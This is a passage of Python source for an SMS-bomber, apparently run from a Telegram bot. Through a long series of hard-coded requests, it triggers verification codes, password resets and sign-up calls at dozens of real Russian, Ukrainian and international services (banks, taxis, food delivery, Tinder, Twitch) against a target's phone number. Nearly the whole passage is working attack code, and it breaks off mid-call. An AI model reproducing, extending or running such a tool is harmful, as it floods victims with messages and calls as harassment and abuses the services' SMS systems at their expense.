            print('[@'+str(bot_username)+'] [+] не отправлено!')
        
        try:
            requests.post('https://api.kinoland.com.ua/api/v1/service/send-sms', headers={"Agent": "website"}, json={"Phone": _phone, "Type": 1})
            print('[@'+str(bot_username)+'] [+] KinoLend отправлен!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')

        try:
            requests.post('https://pizzahut.ru/account/password-reset', data={'reset_by':'phone', 'action_id':'pass-recovery', 'phone': _phonePizzahut, '_token':'*'})
            print('[@'+str(bot_username)+'] [+] PizzaHut sent!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] error in sent!')

        try:
            requests.post('https://www.rabota.ru/remind', data={'credential': _phone})
            print('[@'+str(bot_username)+'] [+] Rabota sent!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] error in sent!')

        try:
            requests.post('https://rutube.ru/api/accounts/sendpass/phone', data={'phone': '+'+_phone})
            print('[@'+str(bot_username)+'] [+] Rutube sent!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] Rutube in sent!')
     
        try:
            requests.post('https://www.citilink.ru/registration/confirm/phone/+'+_phone+'/')
            print('[@'+str(bot_username)+'] [+] Citilink sent!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')

        try:
            requests.post('https://www.smsint.ru/bitrix/templates/sms_intel/include/ajaxRegistrationTrigger.php', data={'name': _name,'phone': _phone, 'promo': 'yellowforma'})
            print('[@'+str(bot_username)+'] [+] Smsint sent!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] error in sent!')

        try:
            requests.get('https://www.oyorooms.com/api/pwa/generateotp?phone='+_phone9+'&country_code=%2B7&nod=4&locale=en')
            print('[@'+str(bot_username)+'] [+] oyorooms sent!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] error in sent!')

        try:
            requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode', params={"pageName":"registerPrivateUserPhoneVerificatio"}, data={"phone": _phone, "recaptcha": "off", "g-recaptcha-response": "",})
            print('[@'+str(bot_username)+'] [+] MVIDEO sent!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] error in sent!')

        try:
            requests.post('https://newnext.ru/graphql', json={'operationName': 'registration', 'variables': {'client': {'firstName': 'Иван', 'lastName': 'Иванов', 'phone': _phone,'typeKeys': ['Unemployed']}},'query': 'mutation registration($client: ClientInput!) {''\n  registration(client: $client) {''\n    token\n    __typename\n  }\n}\n'})
            print('[@'+str(bot_username)+'] [+] newnext sent!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] error in sent!')

        try:
            requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': _phone})
            print('[@'+str(bot_username)+'] [+] Sunlight sent!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] error in sent!')

        try:
            requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/', json={'client_type': 'personal', 'email': _email, 'mobile_phone': _phone, 'deliveryOption': 'sms'})
            print('[@'+str(bot_username)+'] [+] alpari sent!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] error in sent!')

        try:
            requests.post('https://lk.invitro.ru/lk2/lka/patient/refreshCode', data={'phone': _phone})
            print('[@'+str(bot_username)+'] [+] Invitro sent!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] error in sent!')

        try:
            requests.post('https://online.sbis.ru/reg/service/', json={'jsonrpc':'2.0','protocol':'5','method':'Пользователь.ЗаявкаНаФизика','params':{'phone':_phone},'id':'1'})
            print('[@'+str(bot_username)+'] [+] Sberbank sent!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] error in sent!')

        try:
            requests.post('https://ib.psbank.ru/api/authentication/extendedClientAuthRequest', json={'firstName':'Иван','middleName':'Иванович','lastName':'Иванов','sex':'1','birthDate':'10.10.2000','mobilePhone': _phone9,'russianFederationResident':'true','isDSA':'false','personalDataProcessingAgreement':'true','bKIRequestAgreement':'null','promotionAgreement':'true'})
            print('[@'+str(bot_username)+'] [+] Psbank sent!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] error in sent!')

        try:
            requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': _phone})
            print('[@'+str(bot_username)+'] [+] Beltelcom sent!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] error in sent!')

        try:
            requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone})
            print('[@'+str(bot_username)+'] [+] Karusel sent!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] error in sent!')

        try:
            requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={'phone': '+' + _phone})
            print('[@'+str(bot_username)+'] [+] KFC sent!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] error in sent!')

        try:
            requests.post('https://api.chef.yandex/api/v2/auth/sms', json={"phone": _phone})
            print('[@'+str(bot_username)+'] [+] Yandex.Chef sent!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] error in sent!')

        try:
            requests.post('https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code', params={"msisdn": _phone})
            print('[@'+str(bot_username)+'] [+] MTS отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] error in sent!')

        try:
            requests.post("https://api.delitime.ru/api/v2/signup", data={"SignupForm[username]": _phone, "SignupForm[device_type]": 3})
            print('[@'+str(bot_username)+'] [+] Delitime sent!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] error in sent!')

        try:
            requests.get('https://findclone.ru/register', params={'phone': '+' + _phone})
            print('[@'+str(bot_username)+'] [+] findclone звонок отправлен!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] error in sent!')

        try:
            requests.post("https://guru.taxi/api/v1/driver/session/verify", json={"phone": {"code": 1, "number": _phone}})
            print('[@'+str(bot_username)+'] [+] Guru sent!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] error in sent!')

        try:
            requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php', data={'msisdn': _phone, "locale": 'en', 'countryCode': 'ru','version': '1', "k": "ic1rtwz1s1Hj1O0r", "r": "46763"})
            print('[@'+str(bot_username)+'] [+] ICQ sent!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] error in sent!')

        try:
            requests.post("https://terra-1.indriverapp.com/api/authorization?locale=ru", data={"mode": "request", "phone": "+" + _phone,"phone_permission": "unknown", "stream_id": 0, "v": 3, "appversion": "3.20.6","osversion": "unknown", "devicemodel": "unknown"})
            print('[@'+str(bot_username)+'] [+] InDriver sent!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] error in sent!')

        try:
            requests.post('https://lk.invitro.ru/sp/mobileApi/createUserByPassword', data={"password": password,"application": "lkp","login": "+" + _phone})
            print('[@'+str(bot_username)+'] [+] Invitro отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')

        try:
            requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate', json={"phone": _phone})
            print('[@'+str(bot_username)+'] [+] Pmsm sent!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] error in sent!')

        try:
            requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6", data={"phone": _phone})
            print('[@'+str(bot_username)+'] [+] IVI sent!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] error in sent!')

        try:
            requests.post('https://lenta.com/api/v1/authentication/requestValidationCode', json={'phone': '+' + _phone})
            print('[@'+str(bot_username)+'] [+] Lenta sent!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] error in sent!')

        try:
            requests.post('https://cloud.mail.ru/api/v2/notify/applink', json={"phone": "+" + _phone, "api": 2, "email": "email","x-email": "x-email"})
            print('[@'+str(bot_username)+'] [+] Mail.ru sent!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] error in sent!')

        try:
            requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode', params={"pageName": "registerPrivateUserPhoneVerificatio"}, data={"phone": _phone, "recaptcha": 'off', "g-recaptcha-response": ""})
            print('[@'+str(bot_username)+'] [+] MVideo sent!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] error in sent!')

        try:
            requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone", data={"st.r.phone": "+" + _phone})
            print('[@'+str(bot_username)+'] [+] OK sent!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] error in sent!')

        try:
            requests.post("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code", json={"phone": _phone})
            print('[@'+str(bot_username)+'] [+] qlean sent!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] error in sent!')
            
        try:
            requests.post('https://sso.cloud.qlean.ru/http/users/requestotp', headers={"Referer": "https://qlean.ru/sso?redirectUrl=https://qlean.ru/"}, params={"phone": _phone, "clientId":"undefined", "sessionId": str(randint(5000, 9999))})
            print('[@'+str(bot_username)+'] [+] Qlean отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')

        try:
            requests.post("http://smsgorod.ru/sendsms.php", data={"number": _phone})
            print('[@'+str(bot_username)+'] [+] SMSgorod sent!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] error in sent!')

        try:
            requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data={'phone_number': _phone})
            print('[@'+str(bot_username)+'] [+] Tinder sent!')
        except:
            print('[@'+str(bot_username)+'] [-] error in sent!')

        try:
            requests.post('https://passport.twitch.tv/register?trusted_request=true', json={"birthday": {"day": 11, "month": 11, "year": 1999},"client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp", "include_verification_code": True,"password": password, "phone_number": _phone,"username": username})
            print('[@'+str(bot_username)+'] [+] Twitch sent!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] error in sent!')

        try:
            requests.post('https://cabinet.wi-fi.ru/api/auth/by-sms', data={'msisdn': _phone},headers={'App-ID': 'cabinet'})
            print('[@'+str(bot_username)+'] [+] CabWiFi sent!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] error in sent!')

        try:
            requests.post("https://api.wowworks.ru/v2/site/send-code", json={"phone": _phone, "type": 2})
            print('[@'+str(bot_username)+'] [+] wowworks sent!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] error in sent!')

        try:
            requests.post('https://eda.yandex/api/v1/user/request_authentication_code', json={"phone_number": "+" + _phone})
            print('[@'+str(bot_username)+'] [+] Eda.Yandex sent!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] error in sent!')

        try:
            requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
            print('[@'+str(bot_username)+'] [+] Youla sent!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] error in sent!')

        try:
            requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/', json={"client_type": "personal", "email": f"{email}@gmail.ru","mobile_phone": _phone, "deliveryOption": "sms"})
            print('[@'+str(bot_username)+'] [+] Alpari sent!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] error in sent!')

        try:
            requests.post("https://api-prime.anytime.global/api/v2/auth/sendVerificationCode", data={"phone": _phone})
            print('[@'+str(bot_username)+'] [+] SMS sent!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] error in sent!')

        try:
            requests.post('https://www.delivery-club.ru/ajax/user_otp', data={"phone": _phone})
            print('[@'+str(bot_username)+'] [+] Delivery sent!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] error in sent!')

def send_for_number_vip(phone):
        request_timeout = 0.00001
        _email = _name+f'{iteration}'+'@gmail.com'
        email = _name+f'{iteration}'+'@gmail.com'
        _phone='380506691610'
        _phoneNEW=phone[3:]
        _phone = phone
        _phone9 = _phone[1:]
        _phoneAresBank = '+'+_phone[0]+'('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11] #+7+(915)350-99-08
        _phone9dostavista = _phone9[:3]+'+'+_phone9[3:6]+'-'+_phone9[6:8]+'-'+_phone9[8:10] #915+350-99-08
        _phoneOstin = '+'+_phone[0]+'+('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11] # '+7+(915)350-99-08'
        _phonePizzahut = '+'+_phone[0]+' ('+_phone[1:4]+') '+_phone[4:7]+' '+_phone[7:9]+' '+_phone[9:11] # '+7 (915) 350 99 08'
        _phoneGorzdrav = _phone[1:4]+') '+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11] # '915) 350-99-08'
        _phonePozichka = '+'+_phone[0:2]+'-'+_phone[2:5]+'-'+_phone[5:8]+'-'+_phone[8:10]+'-'+_phone[10:12] #38-050-669-16-10'
        _phoneQ = '+'+_phone[0:2]+'('+_phone[2:5]+') '+_phone[5:8]+' '+_phone[8:10]+' '+_phone[10:12] # +38(050) 669 16 10
        _phoneCitrus = '+'+_phone[0:3]+' '+_phone[3:5]+'-'+_phone[5:8]+' '+_phone[8:10]+' '+_phone[10:12]
        _phoneComfy = '+'+_phone[0:2]+' ('+_phone[2:5]+') '+_phone[5:8]+'-'+_phone[8:10]+'-'+_phone[10:12]
        _phone88 = '+'+_phone[0]+' ('+_phone[1:4]+') '+_phone[4:7]+' '+_phone[7:9]+'-'+_phone[9:11]
        _phone585 = '+'+_phone[0]+' ('+_phone[1:4]+') '+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11] #+7 (925) 350-99-08

        standar_headers = {'User-Agent':ua}
        
        
        
        
        
        try:
            requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register', data={'phoneNumber': _phone,'countryCode': 'ID','name': 'test','email': 'mail@mail.com','deviceToken': '*'}, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})
            print('[@'+str(bot_username)+'] [+] Grab отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] Не отправлено!')

        try:
            requests.post('https://api.chef.yandex/api/v2/auth/sms', json={"phone": _phone})
            print('[@'+str(bot_username)+'] [+] chef отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] Не отправлено!') 
            
        try:
            requests.post('https://lenta.com/api/v1/authentication/requestValidationCode', json={'phone': '+' + _phone})
            print('[@'+str(bot_username)+'] [+] lenta отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] Не отправлено!') 
          
        try:
            requests.post('https://dostavista.ru/backend/send-verification-sms', data={"phone": _phone})
            print('[@'+str(bot_username)+'] [+] dos отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] Не отправлено!') 
            
        try:
            requests.post('https://moscow.rutaxi.ru/ajax_keycode.html', data={'l': _phone9}).json()["res"]
            print('[@'+str(bot_username)+'] [+] RuTaxi отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] Не отправлено!')

        try:
            requests.post('https://belkacar.ru/get-confirmation-code', data={'phone': _phone}, headers={})
            print('[@'+str(bot_username)+'] [+] BelkaCar отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] Не отправлено!')
        
        try:
            requests.post('https://secure.online.ua/ajax/check_phone/', params={"reg_phone": _phone})
            print('[@'+str(bot_username)+'] [+] secure отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] Не отправлено!')
            
        try:
            requests.post('https://cabinet.planetakino.ua/service/sms', params={"phone": _phone})
            print('[@'+str(bot_username)+'] [+] planetakino отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] Не отправлено!')    
            
        try:
            requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate', json={"phone": _phone})
            print('[@'+str(bot_username)+'] [+] pmsm отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] Не отправлено!')

        try:
            requests.post('https://api.ivi.ru/mobileapi/user/register/phone/v6', data={"phone": _phone})
            print('[@'+str(bot_username)+'] [+] ivi отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] Не отправлено!')        
            
            
            
            
        try:
            requests.get('https://www.finam.ru/api/smslocker/sendcode', data={"phone": "+" + _phone})
            print('[@'+str(bot_username)+'] [+] finam отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] Не отправлено!')
        
        try:
            requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': _phone}, headers={})
            print('[@'+str(bot_username)+'] [+] mtstv отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] Не отправлено!')
            
        try:
            requests.post('https://account.my.games/signup_send_sms/', data={"phone": _phone})
            print('[@'+str(bot_username)+'] [+] games отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] Не отправлено!')   
            
        try:
            requests.post('https://kasta.ua/api/v2/login/', data={"phone":_phone})
            print('[@'+str(bot_username)+'] [+] kasta отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] Не отправлено!')      
            
        try:
            requests.post('https://taxi-ritm.ru/ajax/ppp/ppp_back_call.php?URL=/', data={"RECALL": "Y", "BACK_CALL_PHONE": _phone})
            print('[@'+str(bot_username)+'] [+] ritm отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] Не отправлено!')
            
        try:
            requests.post('https://city24.ua/personalaccount/account/registration', data={"PhoneNumber": _phone})
            print('[@'+str(bot_username)+'] [+] city24 отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] Не отправлено!')    
            
        try:
            requests.post('https://client-api.sushi-master.ru/api/v1/auth/init', json={"phone": _phone})
            print('[@'+str(bot_username)+'] [+] sushi-master отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] Не отправлено!')
            
        try:
            requests.post('https://auth.multiplex.ua/login', json={"login": _phone})
            print('[@'+str(bot_username)+'] [+] plex отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] Не отправлено!')    

        try:
            requests.post('https://shop.vsk.ru/ajax/auth/postSms/', data={"phone": _phone})
            print('[@'+str(bot_username)+'] [+] vsk отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] Не отправлено!')
            
            
            
            
        try:
            requests.get('https://www.sportmaster.ua/?module=users&action=SendSMSReg&phone=+38%20(050)%20326-87-32', data={"phone": _phone})
            print('[@'+str(bot_username)+'] [+] sportmaster отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] Не отправлено!')
            
        try:
            requests.post('https://koronapay.com/transfers/online/api/users/otps', data={"phone": _phone})
            print('[@'+str(bot_username)+'] [+] korona отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] Не отправлено!')
        
        try:
            requests.post('https://btfair.site/api/user/phone/code', json={"phone": "+" + _phone,})
            print('[@'+str(bot_username)+'] [+] btfair отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] Не отправлено!')
            
        try:
            requests.post('https://thehive.pro/auth/signup', json={"phone": "+" + _phone,})
            print('[@'+str(bot_username)+'] [+] thehive отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] Не отправлено!')
        
        try:
            requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data={'phone_number': _phone}, headers={})
            print('[@'+str(bot_username)+'] [+] Tinder отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] Не отправлено!')

        try:
            requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone}, headers={})
            print('[@'+str(bot_username)+'] [+] Karusel отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] Не отправлено!')

        try:
            requests.post('https://api.tinkoff.ru/v1/sign_up', data={'phone': '+'+_phone}, headers={})
            print('[@'+str(bot_username)+'] [+] Tinkoff отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] Не отправлено!')

        try:
            requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': _phone}, headers={})
            print('[@'+str(bot_username)+'] [+] MTS отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] Не отправлено!')

        try:
            requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
            print('[@'+str(bot_username)+'] [+] Youla отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] Не отправлено!')

        try:
            requests.post('https://pizzahut.ru/account/password-reset', data={'reset_by':'phone', 'action_id':'pass-recovery', 'phone': _phonePizzahut, '_token':'*'})
            print('[@'+str(bot_username)+'] [+] PizzaHut отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] Не отправлено!')

        try:
            requests.post('https://www.rabota.ru/remind', data={'credential': _phone})
            print('[@'+str(bot_username)+'] [+] Rabota отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] Не отправлено!')

        try:
            requests.post('https://rutube.ru/api/accounts/sendpass/phone', data={'phone': '+'+_phone})
            print('[@'+str(bot_username)+'] [+] Rutube отправлено!')
        except:
            requests.post('https://www.citilink.ru/registration/confirm/phone/+'+_phone+'/')
            print('[@'+str(bot_username)+'] [+] Citilink отправлено!')

        try:
            requests.post('https://www.smsint.ru/bitrix/templates/sms_intel/include/ajaxRegistrationTrigger.php', data={'name': _name,'phone': _phone, 'promo': 'yellowforma'})
            print('[@'+str(bot_username)+'] [+] Smsint отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] Не отправлено!')

        try:
            requests.get('https://www.oyorooms.com/api/pwa/generateotp?phone='+_phone9+'&country_code=%2B7&nod=4&locale=en')
            print('[@'+str(bot_username)+'] [+] oyorooms отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] Не отправлено!')

        try:
            requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCodeForOtp', params={'pageName': 'loginByUserPhoneVerification', 'fromCheckout': 'false','fromRegisterPage': 'true','snLogin': '','bpg': '','snProviderId': ''}, data={'phone': _phone,'g-recaptcha-response': '','recaptcha': 'on'})
            print('[@'+str(bot_username)+'] [+] MVideo отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] Не отправлено!')

        try:
            requests.post('https://newnext.ru/graphql', json={'operationName': 'registration', 'variables': {'client': {'firstName': 'Иван', 'lastName': 'Иванов', 'phone': _phone,'typeKeys': ['Unemployed']}},'query': 'mutation registration($client: ClientInput!) {''\n  registration(client: $client) {''\n    token\n    __typename\n  }\n}\n'})
            print('[@'+str(bot_username)+'] [+] newnext отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] Не отправлено!')

        try:
            requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': _phone})
            print('[@'+str(bot_username)+'] [+] Sunlight отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] Не отправлено!')

        try:
            requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/', json={'client_type': 'personal', 'email': _email, 'mobile_phone': _phone, 'deliveryOption': 'sms'})
            print('[@'+str(bot_username)+'] [+] alpari отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] Не отправлено!')

        try:
            requests.post('https://lk.invitro.ru/lk2/lka/patient/refreshCode', data={'phone': _phone})
            print('[@'+str(bot_username)+'] [+] Invitro отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] Не отправлено!')

        try:
            requests.post('https://online.sbis.ru/reg/service/', json={'jsonrpc':'2.0','protocol':'5','method':'Пользователь.ЗаявкаНаФизика','params':{'phone':_phone},'id':'1'})
            print('[@'+str(bot_username)+'] [+] Sberbank отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] Не отправлено!')

        try:
            requests.post('https://ib.psbank.ru/api/authentication/extendedClientAuthRequest', json={'firstName':'Иван','middleName':'Иванович','lastName':'Иванов','sex':'1','birthDate':'10.10.2000','mobilePhone': _phone9,'russianFederationResident':'true','isDSA':'false','personalDataProcessingAgreement':'true','bKIRequestAgreement':'null','promotionAgreement':'true'})
            print('[@'+str(bot_username)+'] [+] Psbank отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] Не отправлено!')

        try:
            requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': _phone})
            print('[@'+str(bot_username)+'] [+] Beltelcom отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] Не отправлено!')

        try:
            requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone})
            print('[@'+str(bot_username)+'] [+] Karusel отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] Не отправлено!')
            
        try:
            requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={'phone': '+' + _phone})
            print('[@'+str(bot_username)+'] [+] KFC отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] Не отправлено!')

        try:
            requests.post("https://api.carsmile.com/",json={"operationName": "enterPhone", "variables": {"phone": _phone},"query": "mutation enterPhone($phone: String!) {\n  enterPhone(phone: $phone)\n}\n"})
            print('[@'+str(bot_username)+'] [+] carsmile отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] Не отправлено!')

        try:
            requests.post('https://www.citilink.ru/registration/confirm/phone/+' + _phone + '/')
            print('[@'+str(bot_username)+'] [+] Citilink отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] Не отправлено!')

        try:
            requests.post("https://api.delitime.ru/api/v2/signup",data={"SignupForm[username]": _phone, "SignupForm[device_type]": 3})
            print('[@'+str(bot_username)+'] [+] Delitime отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] Не отправлено!')

        try:
            requests.get('https://findclone.ru/register', params={'phone': '+' + _phone})
            print('[@'+str(bot_username)+'] [+] findclone звонок отправлен!')
        except:
            print('[@'+str(bot_username)+'] [-] Не отправлено!')

        try:
            requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',data={'msisdn': _phone, "locale": 'en', 'countryCode': 'ru','version': '1', "k": "ic1rtwz1s1Hj1O0r", "r": "46763"})
            print('[@'+str(bot_username)+'] [+] ICQ отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] Не отправлено!')

        try:
            requests.post("https://terra-1.indriverapp.com/api/authorization?locale=ru",data={"mode": "request", "phone": "+" + _phone,"phone_permission": "unknown", "stream_id": 0, "v": 3, "appversion": "3.20.6","osversion": "unknown", "devicemodel": "unknown"})
            print('[@'+str(bot_username)+'] [+] InDriver отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] Не отправлено!')

        try:
            requests.post("https://lk.invitro.ru/sp/mobileApi/createUserByPassword", data={"password": password, "application": "lkp", "login": "+" + _phone})
            print('[@'+str(bot_username)+'] [+] Invitro отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] Не отправлено!')

        try:
            requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate',json={"phone": _phone})
            print('[@'+str(bot_username)+'] [+] Pmsm отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] Не отправлено!')

        try:
            requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6",data={"phone": _phone})
            print('[@'+str(bot_username)+'] [+] IVI отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] Не отправлено!')

        try:
            requests.post('https://cloud.mail.ru/api/v2/notify/applink',json={"phone": "+" + _phone, "api": 2, "email": "email","x-email": "x-email"})
            print('[@'+str(bot_username)+'] [+] Mail.ru отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] Не отправлено!')

        try:
            requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode',params={"pageName": "registerPrivateUserPhoneVerificatio"},data={"phone": _phone, "recaptcha": 'off', "g-recaptcha-response": ""})
            print('[@'+str(bot_username)+'] [+] MVideo отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] Не отправлено!')

        try:
            requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",data={"st.r.phone": "+" + _phone})
            print('[@'+str(bot_username)+'] [+] OK отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] Не отправлено!')

        try:
            requests.post('https://plink.tech/register/',json={"phone": _phone})
            print('[@'+str(bot_username)+'] [+] Plink отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] Не отправлено!')

        try:
            requests.post("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code",json={"phone": _phone})
            print('[@'+str(bot_username)+'] [+] qlean отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] Не отправлено!')

        try:
            requests.post("http://smsgorod.ru/sendsms.php",data={"number": _phone})
            print('[@'+str(bot_username)+'] [+] SMSgorod отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] Не отправлено!')

        try:
            requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',data={'phone_number': _phone})
            print('[@'+str(bot_username)+'] [+] Tinder отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] Не отправлено!')

        try:
            requests.post('https://passport.twitch.tv/register?trusted_request=true',json={"birthday": {"day": 11, "month": 11, "year": 1999},"client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp", "include_verification_code": True,"password": password, "phone_number": _phone,"username": username})
